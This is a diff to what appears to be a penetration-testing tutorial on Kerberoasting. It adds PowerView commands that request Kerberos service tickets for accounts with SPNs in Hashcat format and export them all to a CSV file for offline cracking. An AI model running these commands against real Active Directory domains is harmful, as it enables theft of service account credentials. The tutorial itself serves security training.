@@ -236,10 +236,20 @@ Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows 
 
 #### Using PowerView to Enumerate SPN Accounts
 
-```SHELL
+```POWERSHELL
 Import-Module .\PowerView.ps1
 Get-DomainUser * -spn | select samaccountname
 ```
 
 #### Using PowerView to Target a Specific User
+
+```POWERSHELL
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+
+#### Exporting All Tickets to a CSV File
+
+```POWERSHELL
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
 
